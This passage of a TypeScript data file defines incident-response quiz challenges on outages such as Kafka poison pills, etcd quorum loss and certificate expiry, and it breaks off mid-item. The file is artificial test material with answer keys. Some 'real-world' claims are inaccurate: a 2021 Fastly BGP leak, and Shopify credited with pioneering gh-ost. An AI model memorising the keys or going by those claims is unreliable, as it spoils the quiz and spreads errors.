import { Challenge } from './types';

export const warChallenges: Challenge[] = [
  {
    id: 'ENG-WAR-001',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: '502 Bad Gateway Loop',
    companies: ['Cloudflare', 'Vercel'],
    timeEst: '~15 min',
    level: 'Junior',
    status: 'Not Started',
    desc: 'Nginx is throwing 502 Bad Gateway errors. You check the Node.js application server, and it is running. But logs show the Node process restarting every 5 seconds.',
    solution: 'The application is encountering a fatal uncaught exception during boot (e.g., failed DB connection string) and PM2/Docker is constantly restarting it. Fix the environment variable.',
    options: [
      { label: 'A', title: 'Restart the Nginx proxy', sub: 'sudo systemctl restart nginx', isCorrect: false },
      { label: 'B', title: 'Fix the bad environment variable causing boot crash', sub: 'Check .env, fix DB_URL, then pm2 restart app', isCorrect: true },
      { label: 'C', title: 'Scale out to 3 more pods', sub: 'kubectl scale deployment app --replicas=6', isCorrect: false },
      { label: 'D', title: 'Reboot the entire host machine', sub: 'sudo reboot', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-002',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Disk 100% Full (No Space Left on Device)',
    companies: ['AWS', 'DigitalOcean'],
    timeEst: '~15 min',
    level: 'Junior',
    status: 'Not Started',
    desc: 'The database server suddenly stopped accepting writes. `df -h` shows `/var/log` is at 100% capacity.',
    solution: 'Application debug logs were left on in production, and log rotation (logrotate) was not configured. Find the massive log file, truncate it (`> app.log`), and setup logrotate.',
    options: [
      { label: 'A', title: 'Reboot the database server', sub: 'sudo reboot', isCorrect: false },
      { label: 'B', title: 'Increase EBS volume size immediately', sub: 'aws ec2 modify-volume --size 500', isCorrect: false },
      { label: 'C', title: 'Truncate the giant log file and configure logrotate', sub: '> /var/log/app.log && nano /etc/logrotate.d/app', isCorrect: true },
      { label: 'D', title: 'Restart the Postgres service', sub: 'sudo systemctl restart postgresql', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-003',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Postgres Max Connections Exhausted',
    companies: ['Supabase', 'Heroku'],
    timeEst: '~25 min',
    level: 'Mid',
    status: 'Not Started',
    desc: 'Traffic spiked 3x. The API servers auto-scaled from 5 pods to 50 pods. Immediately after scaling, the entire platform went offline with "FATAL: sorry, too many clients already".',
    solution: 'Each new API pod opened its own pool of DB connections, exceeding Postgres\'s `max_connections` limit. Deploy a connection pooler like PgBouncer to multiplex connections.',
    options: [
      { label: 'A', title: 'Scale the API pods back down to 5', sub: 'kubectl scale deployment api --replicas=5', isCorrect: false },
      { label: 'B', title: 'Increase max_connections in postgresql.conf to 10,000', sub: 'ALTER SYSTEM SET max_connections = 10000;', isCorrect: false },
      { label: 'C', title: 'Deploy PgBouncer to multiplex all pod connections', sub: 'helm install pgbouncer bitnami/pgbouncer', isCorrect: true },
      { label: 'D', title: 'Restart the primary database', sub: 'sudo systemctl restart postgresql', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-004',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Kafka Poison Pill (Dead Letter Queue)',
    companies: ['Uber', 'DoorDash'],
    timeEst: '~30 min',
    level: 'Mid',
    status: 'Not Started',
    desc: 'The order-fulfillment microservice stopped processing new orders 2 hours ago. CPU is low. The consumer group lag is in the millions. A single malformed JSON message is at the head of the partition.',
    solution: 'The consumer crashes parsing the bad message, restarts, and pulls the exact same message again in an infinite loop. Manually advance the Kafka offset or implement a Dead Letter Queue (DLQ) for failed messages.',
    options: [
      { label: 'A', title: 'Restart the consumer service pods', sub: 'kubectl rollout restart deployment order-consumer', isCorrect: false },
      { label: 'B', title: 'Delete and recreate the Kafka topic', sub: 'kafka-topics.sh --delete --topic orders', isCorrect: false },
      { label: 'C', title: 'Increase consumer group instances to process lag faster', sub: 'kubectl scale deployment order-consumer --replicas=20', isCorrect: false },
      { label: 'D', title: 'Skip the bad message by advancing the offset, implement DLQ', sub: 'kafka-consumer-groups.sh --reset-offsets --to-offset +1', isCorrect: true },
    ]
  },
  {
    id: 'ENG-WAR-005',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'ElasticSearch Split-Brain',
    companies: ['Datadog', 'Elastic'],
    timeEst: '~35 min',
    level: 'Senior',
    status: 'Not Started',
    desc: 'A brief network partition occurred between AZ1 and AZ2. Now, users are seeing completely different search results depending on which server processes their request. Data is diverging.',
    solution: 'The ES cluster experienced "Split Brain". Both halves elected a master node because `minimum_master_nodes` was misconfigured (not set to N/2 + 1). You must manually resolve data conflicts and restart nodes.',
    options: [
      { label: 'A', title: 'Add more ES data nodes to each AZ', sub: 'terraform apply -var es_node_count=10', isCorrect: false },
      { label: 'B', title: 'Set minimum_master_nodes = N/2+1, resolve conflicts, restart', sub: 'PUT /_cluster/settings { minimum_master_nodes: 2 }', isCorrect: true },
      { label: 'C', title: 'Restore both sides from yesterday\'s snapshot', sub: 'POST /_snapshot/backup/restore', isCorrect: false },
      { label: 'D', title: 'Increase the ES heap size on all nodes', sub: 'ES_JAVA_OPTS="-Xms8g -Xmx8g"', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-006',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Cascading Failure via Synchronous Calls',
    companies: ['Amazon', 'Netflix'],
    timeEst: '~30 min',
    level: 'Senior',
    status: 'Not Started',
    desc: 'The non-critical "Recommendations" service slowed down. Suddenly, the critical "Checkout" service crashed. Why did a minor service take down the core business?',
    solution: 'Checkout makes synchronous REST calls to Recommendations. Because it slowed down, Checkout threads blocked waiting for replies, exhausting thread pools. Implement the Circuit Breaker pattern.',
    options: [
      { label: 'A', title: 'Scale up the Recommendations service', sub: 'kubectl scale deployment recommendations --replicas=30', isCorrect: false },
      { label: 'B', title: 'Restart the Checkout service pods', sub: 'kubectl rollout restart deployment checkout', isCorrect: false },
      { label: 'C', title: 'Add a timeout + Circuit Breaker on Checkout → Recommendations calls', sub: 'Implement Resilience4j/Hystrix circuit breaker with 500ms timeout', isCorrect: true },
      { label: 'D', title: 'Move both services into a single monolith', sub: 'Consolidate to reduce network hops', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-007',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Expired SSL Certificate',
    companies: ['Twilio', 'Okta'],
    timeEst: '~10 min',
    level: 'Junior',
    status: 'Not Started',
    desc: 'At exactly 00:00 UTC, all iOS mobile apps failed to connect to the API with vague network errors. Web users see a red padlock.',
    solution: 'The wildcard SSL/TLS certificate expired. Jump into the load balancer/Certbot, renew the certificate, and restart the proxy layer.',
    options: [
      { label: 'A', title: 'Restart all API server pods', sub: 'kubectl rollout restart deployment api', isCorrect: false },
      { label: 'B', title: 'Roll back the last deployment', sub: 'kubectl rollout undo deployment api', isCorrect: false },
      { label: 'C', title: 'Renew the TLS certificate and reload the proxy', sub: 'certbot renew && sudo nginx -s reload', isCorrect: true },
      { label: 'D', title: 'Flush Cloudflare CDN cache globally', sub: 'cf purge --all-zones', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-008',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Replication Lag causing Stale Reads',
    companies: ['Meta', 'Instagram'],
    timeEst: '~20 min',
    level: 'Mid',
    status: 'Not Started',
    desc: 'Users are complaining that when they update their profile picture, it still shows the old picture on their feed immediately after saving.',
    solution: 'Writes go to the Primary DB, but Reads come from the Replica. Due to high load, replication lag is 2 seconds. Force reads to the Primary DB for the current user for 5 seconds after a write (Read-Your-Writes consistency).',
    options: [
      { label: 'A', title: 'Invalidate the CDN cache on every profile update', sub: 'cf purge --tag=profile-images', isCorrect: false },
      { label: 'B', title: 'Disable read replicas entirely and read from primary always', sub: 'DB_READ_HOST=$DB_PRIMARY_HOST', isCorrect: false },
      { label: 'C', title: 'After a write, force reads to the Primary for 5 seconds', sub: 'Set session flag: read_from_primary=true for 5s TTL', isCorrect: true },
      { label: 'D', title: 'Add more read replicas to reduce per-replica lag', sub: 'terraform apply -var replica_count=5', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-009',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'OOM Killed (Memory Leak over time)',
    companies: ['Docker', 'Kubernetes'],
    timeEst: '~25 min',
    level: 'Mid',
    status: 'Not Started',
    desc: 'Every 24 hours, K8s kills the reporting pod with exit code 137. The memory graphs show a slow, perfect diagonal line climbing upward until death.',
    solution: 'Exit code 137 means Out Of Memory (OOMKilled). Use a heap snapshot profiler to find the array or global object that is growing indefinitely without being garbage collected.',
    options: [
      { label: 'A', title: 'Raise the pod memory limit to 16GB', sub: 'resources: limits: memory: 16Gi', isCorrect: false },
      { label: 'B', title: 'Add a daily cron job to restart the pod', sub: 'kubectl delete pod reporting-xxx (via CronJob)', isCorrect: false },
      { label: 'C', title: 'Use a heap profiler to find and fix the memory leak', sub: 'node --inspect app.js, capture heap snapshots over time', isCorrect: true },
      { label: 'D', title: 'Migrate the service to a serverless Lambda function', sub: 'serverless deploy --function reporting', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-010',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'DNS Propagation Outage',
    companies: ['Shopify', 'Squarespace'],
    timeEst: '~20 min',
    level: 'Mid',
    status: 'Not Started',
    desc: 'We migrated our domain to a new AWS load balancer. 50% of global users can access the site, but the other 50% are hitting the old decommissioned IP address and timing out.',
    solution: 'The TTL (Time To Live) on the old DNS A-record was set to 48 hours instead of 5 minutes before the migration. You must temporarily turn the old server back on and proxy traffic to the new one while DNS propagates globally.',
    options: [
      { label: 'A', title: 'Flush DNS on all global Cloudflare edge nodes', sub: 'cf dns purge --all', isCorrect: false },
      { label: 'B', title: 'Force all users to refresh their browser cache', sub: 'Send a push notification to clear browser cache', isCorrect: false },
      { label: 'C', title: 'Bring old server back up and proxy it to new LB while DNS propagates', sub: 'Restart old EC2, configure nginx proxy_pass to new LB IP', isCorrect: true },
      { label: 'D', title: 'Roll back the DNS change entirely and stay on old server', sub: 'aws route53 change-resource-record-sets (revert)', isCorrect: false },
    ]
  },
  {
    id: 'ENG-WAR-011',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'BGP Route Leak Takes Down Global CDN',
    companies: ['Cloudflare', 'Fastly'],
    timeEst: '~20 min',
    level: 'Senior',
    status: 'Not Started',
    realWorldContext: `In April 2021, a misconfigured BGP route leak at a small ISP caused roughly 16,000 Fastly prefixes to be briefly routed through an unintended path, taking a large portion of the internet offline for ~1 hour. Cloudflare has documented similar BGP hijack events. BGP leaks cause routers worldwide to send traffic to the wrong place — and fixing it requires withdrawing the leaked routes and confirming propagation globally.`,
    desc: `Your CDN is reporting packet loss in all regions simultaneously. Monitoring shows traffic is suddenly being routed through an unexpected AS (Autonomous System). Customers cannot reach your edge nodes. The network team suspects a BGP route leak — a peer is advertising your IP prefixes with a shorter AS path than yours.`,
    solution: `Contact the upstream ISP to withdraw the leaked route announcement. Apply a BGP prefix filter (max-prefix limit) on peering sessions to prevent future leaks. Issue a more-specific route announcement from your own AS to reclaim traffic while the leak propagates out.`,
    explanation: `BGP (Border Gateway Protocol) is the routing protocol of the internet. Routers trust announcements from peers — a misconfigured peer can advertise your prefixes with a shorter (more preferred) path, attracting global traffic away from your servers. Fix: (1) identify the leaking AS via BGP monitoring tools like RIPE Stat or BGPmon, (2) contact the upstream to withdraw the announcement, (3) announce a more-specific /24 prefix from your own AS to take priority while the leak clears.`,
    options: [
      { label: 'A', title: 'Flush DNS cache on all edge nodes', sub: 'systemd-resolve --flush-caches on every PoP', isCorrect: false },
      { label: 'B', title: 'Identify the leaking AS, contact upstream, announce more-specific prefix', sub: 'bgp prefix-list LEAK-FILTER + more-specific /24 announcement', isCorrect: true },
      { label: 'C', title: 'Restart the Anycast routing daemon on all PoPs', sub: 'systemctl restart bird on all edge nodes', isCorrect: false },
      { label: 'D', title: 'Failover all traffic to a single origin data center', sub: 'Disable CDN, point DNS A record to origin IP', isCorrect: false },
    ]
  },

  {
    id: 'ENG-WAR-012',
    type: 'War Room',
    badgeClass: 'badge-war',
    title: 'Kubernetes etcd Split-Brain After Node Replacement',
    companies: ['Google Cloud', 'OpenAI'],
    timeEst: '~35 min',
    level: 'Senior',
    status: 'Not Started',
    realWorldContext: `OpenAI's December 2024 outage was caused by a misconfigured telemetry service overwhelming Kubernetes API servers, which then broke DNS-based service discovery. Reddit's Pi-Day 2023 outage (314 minutes!) was caused by a Kubernetes cluster upgrade where node metadata changed between versions, breaking workload networking. Both incidents share a root cause: the Kubernetes control plane becoming unhealthy cascades to the data plane.`,
    desc: `After a routine Kubernetes control-plane node replacement in your production cluster, the new node failed to join the etcd quorum. The etcd cluster now has only 1 of 3 members healthy, losing quorum. The API server is read-only — \`kubectl apply\` hangs. Running pods continue to serve traffic but no new deployments, scaling events, or config changes are possible. Your team has 2 hours before a scheduled release.`,
    solution: `First, DO NOT delete the unhealthy etcd member — losing quorum further would permanently corrupt the cluster. Restore the failed etcd member from a recent snapshot, or forcefully add the replacement node using etcdctl member add with the correct peer URL. Verify quorum with etcdctl endpoint health. Never restore from a snapshot unless quorum is permanently unrecoverable.`,
    explanation: `etcd uses the Raft consensus protocol requiring N/2+1 healthy members for writes. With 3 nodes and 1 healthy, you have no quorum. The correct fix: (1) verify the failed member's state via etcdctl member list, (2) if the node is reachable but misconfigured, fix its peer URL with etcdctl member update, (3) if truly dead, use etcdctl member remove then etcdctl member add on a fresh node. Never guess — a bad restore wipes all cluster state.`,
    options: [
      { label: 'A', title: 'Restore etcd from yesterday\'s snapshot immediately', sub: 'etcdctl snapshot restore snapshot.db --data-dir=/var/lib/etcd', isCorrect: false },
      { label: 'B', title: 'Restart all three API server pods to force leader re-election', sub: 'kubectl delete pod -n kube-system kube-apiserver-*', isCorrect: false },
      { label: 'C', title: 'Fix or re-add the failed etcd member with correct peer URL, restore quorum', sub: 'etcdctl member update <id> --peer-urls=https://new-node:2380', isCorrect: true },
      { label: 'D', title: 'Immediately create a brand new cluster and migrate all workloads', sub: 'eksctl create cluster + kubectl apply all manifests', isCorrect: false },
    ]
  },

{
  id: 'ENG-WAR-013',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'CoreDNS ndots:5 Causing Latency Spike',
          companies: ['Cloudflare', 'Preply'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Preply's 2020 Kubernetes postmortem revealed that the default Kubernetes DNS configuration (ndots:5) was causing every DNS query to attempt 5 absolute lookups before resolving correctly. A service calling "redis" internally would try redis.namespace.svc.cluster.local, redis.svc.cluster.local, redis.cluster.local, redis.company.com, redis — in that order — before succeeding. Under load, this flooded CoreDNS and caused conntrack table exhaustion.`,
                    desc: `After scaling your Kubernetes cluster from 20 to 100 nodes, internal service-to-service calls are intermittently failing with 5-second timeouts. External API calls from pods are also slow. CPU on CoreDNS pods is at 100%. The application logs show DNS resolution timeouts. Node conntrack tables are filling up.`,
                      solution: `The Kubernetes default resolv.conf sets ndots:5, causing every hostname to attempt multiple FQDN lookups before finding the correct answer. Fix: (1) Set ndots:1 or ndots:2 in your pod spec's dnsConfig, (2) use fully-qualified domain names (FQDNs) ending with a dot for external calls, (3) add more CoreDNS replicas and set NodeLocal DNSCache to reduce conntrack pressure.`,
                        explanation: `ndots:5 means any hostname with fewer than 5 dots gets expanded with search domain suffixes first. A call to 'api.stripe.com' becomes 5 failed lookups before the correct external resolution. At scale, this means every pod multiplies DNS traffic by 5x. NodeLocal DNSCache (running a DNS cache on each node) eliminates the conntrack table pressure entirely since the daemonset runs in hostNetwork mode.`,
                          options: [
                            { label: 'A', title: 'Increase CoreDNS pod memory limits to 2GB', sub: 'kubectl patch deploy coredns -n kube-system --patch resources', isCorrect: false },
                            { label: 'B', title: 'Set ndots:1 in pod dnsConfig + enable NodeLocal DNSCache DaemonSet', sub: 'dnsConfig: options: [{name: ndots, value: "1"}]', isCorrect: true },
                            { label: 'C', title: 'Switch from CoreDNS to kube-dns', sub: 'Reinstall cluster with kube-dns instead of CoreDNS', isCorrect: false },
                            { label: 'D', title: 'Increase conntrack table size on all nodes', sub: 'sysctl -w net.netfilter.nf_conntrack_max=1000000', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-014',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'AWS S3 Runaway rm Command (Region-Wide Outage)',
          companies: ['AWS', 'Airbnb'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `The real AWS S3 US-East-1 outage in February 2017 was caused by an engineer running a debugging script to remove a small number of billing servers. A typo in the parameter caused significantly more servers to be removed than intended, taking S3 offline for 4 hours and knocking out nearly every major website. AWS's own status page was down because it ran on S3.`,
                    desc: `A junior engineer ran a maintenance script with a typo in the bucket name parameter. Instead of deleting temporary files in 'app-logs-temp', the script targeted 'app-logs' — your primary application asset bucket containing 500GB of user-uploaded files and static assets. The delete operation ran for 3 minutes before the engineer noticed and killed it. An unknown number of objects have been permanently deleted. The CDN is now returning 403s for missing assets.`,
                      solution: `Check if S3 versioning was enabled on the bucket — if yes, use S3 Batch Operations to restore all deleted objects by deleting the deletion markers. If versioning was not enabled, restore from the most recent backup (S3 Cross-Region Replication or an AWS Backup vault). Immediately enable S3 Object Lock on the restored bucket to prevent future accidental deletes.`,
                        explanation: `S3 versioning is the safety net for accidental deletes. When versioning is on, deleting an object creates a "delete marker" — the original version is still there. You can recover by removing the delete markers. If versioning was off, you need a backup. Prevention: (1) always enable versioning on critical buckets, (2) use IAM bucket policies that deny DeleteObject to application roles, (3) use MFA-protected bucket policies for human deletion.`,
                          options: [
                            { label: 'A', title: 'Immediately recreate the bucket with the same name and re-upload assets', sub: 'aws s3 mb s3://app-logs && re-run asset pipeline', isCorrect: false },
                            { label: 'B', title: 'Check S3 versioning — restore via delete-marker removal or backup restore', sub: 'aws s3api list-object-versions + S3 Batch Operations to remove delete markers', isCorrect: true },
                            { label: 'C', title: 'Open an AWS support ticket and wait for them to restore the data', sub: 'AWS support case: S3 accidental delete recovery', isCorrect: false },
                            { label: 'D', title: 'Restore assets from engineer\'s local laptop cache', sub: 'Copy browser cached files back to S3', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-015',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Thundering Herd After Cache Warm-Up Failure',
          companies: ['Twitter', 'Reddit'],
            timeEst: '~25 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `When Twitter's cache clusters are restarted or warmed up after maintenance, every cache miss hits the database simultaneously. Facebook coined "cache stampede" for this — after a cache restart, thousands of requests simultaneously find the same key missing and all query the database at once. Reddit experienced a similar thundering herd during their Pi-Day 2023 Kubernetes upgrade when caches went cold.`,
                    desc: `After a Redis cluster failover to a fresh node, the cache is completely empty. Within seconds, your database CPU spikes to 100%, connections are exhausted, and APIs return 504s. The Redis cache is warming up, but every request is hitting the database simultaneously because all keys are expired. The issue is self-reinforcing — the database is so overloaded it can't respond, so cache misses keep piling up.`,
                      solution: `Immediately enable a Cache Stampede protection strategy: (1) apply a request coalescer (only 1 request per cache key hits the DB; others wait for the first result), or (2) implement probabilistic early recomputation (PER) to prevent simultaneous expiry. Short-term: use a circuit breaker to shed load and serve stale data. Long-term: pre-warm the cache from a backup before bringing a new Redis node into production.`,
                        explanation: `Thundering herd / cache stampede occurs when many cached keys expire simultaneously or a cache is emptied, sending all requests directly to the database. Three defense patterns: (1) Mutex/lock: only one process recomputes an expired key, others wait. (2) Probabilistic Early Recomputation: slightly before expiry, recompute early with some probability. (3) Stale-while-revalidate: serve the old (stale) value while a background process refreshes it.`,
                          options: [
                            { label: 'A', title: 'Scale database to a larger instance type immediately', sub: 'aws rds modify-db-instance --db-instance-class db.r6g.4xlarge', isCorrect: false },
                            { label: 'B', title: 'Restart the entire application fleet to clear in-flight requests', sub: 'kubectl rollout restart deployment --all', isCorrect: false },
                            { label: 'C', title: 'Apply request coalescing + serve stale data while cache repopulates', sub: 'Enable cache stampede protection (mutex/stale-while-revalidate)', isCorrect: true },
                            { label: 'D', title: 'Disable Redis and route all traffic to read replicas', sub: 'Swap CACHE_BACKEND from redis to database', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-016',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Terraform Destroy in the Wrong Workspace',
          companies: ['HashiCorp', 'Shopify'],
            timeEst: '~30 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `A famous Spotify incident involved accidentally deleting all of their Kubernetes clusters due to running Terraform in the wrong context. An engineer selecting the wrong Terraform workspace and running terraform destroy has wiped out entire production environments. Spotify recovered with no user impact thanks to GitOps — they simply re-applied their entire infrastructure from code. Teams without IaC have been less fortunate.`,
                    desc: `An engineer accidentally ran terraform destroy in the production workspace instead of staging. The Terraform state shows that your production VPC, all subnets, security groups, RDS cluster, ElastiCache cluster, and 15 EC2 instances have been destroyed. AWS is actively tearing down resources. The application is completely down. You have Terraform state and code in git but no recent snapshots of the database.`,
                      solution: `Stop the destroy if still in progress (Ctrl+C kills the Terraform process; AWS resource deletion continues but may be interrupted). Enable Termination Protection on critical resources in the future. Immediately check for RDS automated backups — AWS keeps them for the retention period even if the instance is deleted. Re-provision infrastructure with terraform apply using the same code. Restore the database from the latest automated snapshot.`,
                        explanation: `Prevention is the real lesson: (1) Enable deletion protection on RDS, ElastiCache, and critical EC2 instances — terraform destroy will fail on protected resources. (2) Use AWS Config rules to alert on resource deletion. (3) Require manual confirmation in CI/CD: terraform plan output must be reviewed before any destroy. (4) Use Terraform Cloud workspaces with required approval steps for production. (5) Store RDS snapshots with lifecycle policies that survive instance deletion.`,
                          options: [
                            { label: 'A', title: 'Roll back Terraform state to previous version and re-run apply', sub: 'git checkout HEAD~1 terraform.tfstate && terraform apply', isCorrect: false },
                            { label: 'B', title: 'Contact AWS Support to reverse all resource deletions', sub: 'Open P1 support case: reverse accidental terraform destroy', isCorrect: false },
                            { label: 'C', title: 'Re-provision infra via terraform apply; restore DB from automated RDS snapshot', sub: 'terraform apply -var-file=prod.tfvars + aws rds restore-db-cluster-from-snapshot', isCorrect: true },
                            { label: 'D', title: 'Promote the staging environment to production immediately', sub: 'Point prod DNS to staging infrastructure', isCorrect: false },
                          ]
},
{
  id: 'ENG-WAR-017',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Nginx Config Reload Drops Active WebSocket Connections',
          companies: ['Slack', 'Discord'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Discord's real-time messaging relies on millions of persistent WebSocket connections. Nginx config reloads (nginx -s reload) send SIGQUIT to workers, which wait for active connections to close gracefully — but without proper timeout configuration, this can force-close tens of thousands of WebSocket connections, causing all connected clients to immediately reconnect in a thundering herd.`,
                    desc: `Your ops team pushed an Nginx config update (a new rate limiting rule) and did a reload. Within seconds, 40,000 WebSocket users were disconnected. The reconnect storm is now flooding your backend servers. CPU is peaking, and new connections are timing out because the backend cannot handle the burst. Users are seeing the "reconnecting..." spinner.`,
                      solution: `The Nginx reload caused active workers to wait for connections to drain with no timeout, but some connection handling was not graceful. Fix: configure worker_shutdown_timeout in nginx.conf so workers close connections within a bounded time. For the current incident: the reconnect storm is the immediate problem — implement exponential backoff + jitter on client reconnects to spread the load over 30-60 seconds instead of all at once.`,
                        explanation: `Nginx reload sends SIGQUIT to old workers, which gracefully wait for active connections to finish. Without worker_shutdown_timeout, this can take minutes. Meanwhile, WebSockets sitting on old workers will eventually be forcefully closed as old workers kill idle connections. The thundering herd fix is exponential backoff + jitter on the client: instead of all 40k clients reconnecting at T+0, they reconnect at T + random(0, 30) seconds, spreading the load.`,
                          options: [
                            { label: 'A', title: 'Immediately roll back the nginx config and restart nginx completely', sub: 'git checkout nginx.conf && systemctl restart nginx', isCorrect: false },
                            { label: 'B', title: 'Add worker_shutdown_timeout; implement client reconnect exponential backoff + jitter', sub: 'worker_shutdown_timeout 10s; client: retry after Math.random()*30s', isCorrect: true },
                            { label: 'C', title: 'Scale backend servers to 10x to absorb reconnect storm', sub: 'kubectl scale deployment backend --replicas=300', isCorrect: false },
                            { label: 'D', title: 'Block all WebSocket reconnects for 60 seconds at the load balancer', sub: 'iptables -A INPUT -p tcp --dport 443 --tcp-flags SYN SYN -j DROP', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-018',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'CrowdStrike-style Kernel Panic (Faulty Driver Update)',
          companies: ['Microsoft', 'Delta Airlines'],
            timeEst: '~30 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `The July 2024 CrowdStrike Falcon sensor update caused 8.5 million Windows machines to BSOD (Blue Screen of Death) globally. The faulty kernel-level driver caused an out-of-bounds memory read during boot, making machines unbootable. The fix required booting into Safe Mode or WinRE and manually deleting a single file — there was no remote fix because the machines couldn't boot far enough to receive commands.`,
                    desc: `After a security software update was pushed to your entire Windows fleet via your MDM (Mobile Device Management) tool at 2am, 3,000 Windows servers and 8,000 employee laptops are stuck in a BSOD boot loop. The machines reboot into a crash, reboot again, crash again. Remote management tools cannot connect because the machines never boot completely. The culprit is a kernel driver file dropped by the security software update.`,
                      solution: `Boot machines into Windows Recovery Environment (WinRE) or Safe Mode, navigate to the security software's driver directory, and delete the faulty .sys file. For servers: use Azure Serial Console, AWS Systems Manager Run Command via EC2 Serial Console, or out-of-band management (IPMI/iLO) to access the machine before the OS boots. For cloud VMs, detach the OS disk, mount it on a healthy VM, delete the file, reattach.`,
                        explanation: `Kernel-level security drivers load during boot before any remote management agent can initialize. This is why there's no "remote fix" — the machine never reaches the point where RDP, SSH, or agents work. The recovery playbook: (1) use out-of-band management (IPMI, serial console) or cloud disk attachment to access the filesystem without booting the OS fully, (2) delete the offending driver file, (3) reboot normally. Prevention: stage security software updates through rings — 1% of fleet, wait 24h, then 10%, then 100%.`,
                          options: [
                            { label: 'A', title: 'Push a remediation script via the MDM tool to all affected machines', sub: 'Deploy script: del C:\\Windows\\System32\\drivers\\bad_driver.sys', isCorrect: false },
                            { label: 'B', title: 'Roll back the security software update via MDM to all machines', sub: 'MDM: Rollback package version to previous build', isCorrect: false },
                            { label: 'C', title: 'Use out-of-band/serial console access to boot WinRE and delete the faulty driver', sub: 'EC2 Serial Console / IPMI → WinRE → del %windir%\\System32\\drivers\\bad.sys', isCorrect: true },
                            { label: 'D', title: 'Restore all VMs from yesterday\'s snapshots', sub: 'aws ec2 create-image + restore from AMI for all instances', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-019',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Zero-Downtime Deployment Causes Database Schema Lock',
          companies: ['GitHub', 'Shopify'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `GitHub experienced multiple production incidents caused by database schema migrations that ran ALTER TABLE with full table locks. For a 200M-row table, MySQL's ALTER TABLE adds a column with a full exclusive lock — blocking all reads and writes for 30+ minutes. Shopify's engineering team pioneered the "ghost" migration approach (pt-online-schema-change and gh-ost) to run zero-lock migrations on huge tables.`,
                    desc: `A deployment ran a database migration: ALTER TABLE orders ADD COLUMN discount_code VARCHAR(255). The orders table has 400 million rows. The migration has been running for 22 minutes and shows no sign of completing. All write operations to the orders table are queued and timing out (Checkout is down). Read operations are also blocked. Killing the migration would roll back 22 minutes of work and the migration would need to re-run.`,
                      solution: `Kill the running ALTER TABLE (it will rollback cleanly). Use gh-ost (GitHub's online schema change tool) or pt-online-schema-change instead — these tools add the column by: (1) creating a shadow table with the new schema, (2) streaming binlog changes to keep it in sync, (3) doing a near-atomic swap of the tables. The migration runs with minimal locking.`,
                        explanation: `MySQL's ALTER TABLE acquires a metadata lock for the duration of the operation on tables without online DDL support. For huge tables, this means minutes or hours of complete unavailability. Online schema change tools work around this: gh-ost creates a shadow table, copies rows in chunks, tails the MySQL binlog to apply concurrent writes to the shadow table, then does a final atomic RENAME. The only locking is a microsecond-level RENAME at the very end.`,
                          options: [
                            { label: 'A', title: 'Wait for the migration to complete — it\'s safer than killing it', sub: 'Keep the ALTER TABLE running, put up a maintenance page', isCorrect: false },
                            { label: 'B', title: 'Kill the migration, re-run it using gh-ost for zero-lock online migration', sub: 'KILL <query_id>; gh-ost --alter "ADD COLUMN discount_code VARCHAR(255)" --table=orders', isCorrect: true },
                            { label: 'C', title: 'Kill the migration and re-run it immediately at 3am when traffic is lowest', sub: 'Schedule migration during off-peak: ALTER TABLE orders ADD COLUMN...', isCorrect: false },
                            { label: 'D', title: 'Increase MySQL max_allowed_packet and innodb_lock_wait_timeout', sub: 'SET GLOBAL innodb_lock_wait_timeout=3600', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-020',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Let\'s Encrypt Rate Limit Blocks Certificate Renewal',
          companies: ['Vercel', 'Netlify'],
            timeEst: '~20 min',
              level: 'Junior',
                status: 'Not Started',
                  realWorldContext: `Vercel and Netlify automatically provision Let's Encrypt TLS certificates for millions of custom domains. Let's Encrypt enforces a rate limit of 50 certificates per registered domain per week. A misconfigured certificate manager that retries on failure can quickly exhaust this limit, leaving all new custom domains unable to get certificates — causing HTTPS to fail for hundreds of customer sites.`,
                    desc: `Your platform provisions Let's Encrypt certificates automatically for customer custom domains. An engineer deployed a bug that caused the certificate provisioning service to retry failed ACME requests in a tight loop (no exponential backoff). Within 4 hours, the service burned through all 50 certificates for your wildcard domain for the week. New customers adding custom domains get HTTPS errors. Existing customers are unaffected.`,
